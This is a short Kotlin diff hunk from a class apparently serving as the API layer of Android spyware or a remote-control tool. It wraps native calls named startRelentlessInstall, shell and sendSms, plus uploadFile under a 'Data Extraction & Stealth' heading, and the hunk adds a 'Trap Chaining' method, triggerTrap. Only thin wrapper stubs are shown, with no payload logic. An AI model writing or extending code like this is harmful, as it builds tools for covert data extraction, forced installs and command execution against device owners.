@@ -49,6 +49,9 @@ class CortexNativeAPI(private val bridge: Any) {
     fun startRelentlessInstall(apkPath: String) = call("startRelentlessInstall", apkPath, String::class.java)
     fun shell(cmd: String) = call("shell", cmd, String::class.java)
 
+    // --- Trap Chaining ---
+    fun triggerTrap(type: String, label: String) = call("triggerTrap", arrayOf(type, label), arrayOf(String::class.java, String::class.java))
+
     // --- Data Extraction & Stealth ---
     fun uploadFile(filePath: String, category: String) = call("uploadFile", arrayOf(filePath, category), arrayOf(String::class.java, String::class.java))
     fun sendSms(number: String, message: String) = call("sendSms", arrayOf(number, message), arrayOf(String::class.java, String::class.java))
